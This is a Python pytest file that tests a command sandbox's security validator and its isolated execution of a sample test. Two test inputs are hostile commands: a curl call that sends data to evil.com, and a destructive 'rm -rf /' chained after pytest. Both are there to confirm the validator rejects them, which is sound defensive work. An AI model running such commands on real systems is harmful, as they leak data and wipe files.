import pytest
from app.execution.sandbox import ExecutionSandbox, SecurityPolicyError


def test_command_security_validation():
    # Disallowed binary
    with pytest.raises(SecurityPolicyError):
        ExecutionSandbox.validate_command("curl http://evil.com/leak")

    # Disallowed pattern rm -rf
    with pytest.raises(SecurityPolicyError):
        ExecutionSandbox.validate_command("pytest && rm -rf /")

    # Allowed command
    ExecutionSandbox.validate_command("pytest tests/test_sample.py")
    ExecutionSandbox.validate_command("python -m unittest discover")


@pytest.mark.asyncio
async def test_sandbox_isolated_execution():
    files = {
        "tests/test_math.py": "def test_addition():\n    assert 2 + 2 == 4\n"
    }
    result = await ExecutionSandbox.run_command_in_sandbox(
        command="pytest tests/test_math.py",
        files_to_mount=files,
        timeout_seconds=15,
    )
    assert result["exit_code"] == 0
    assert result["status"] == "passed"
    assert result["passed_tests"] >= 1
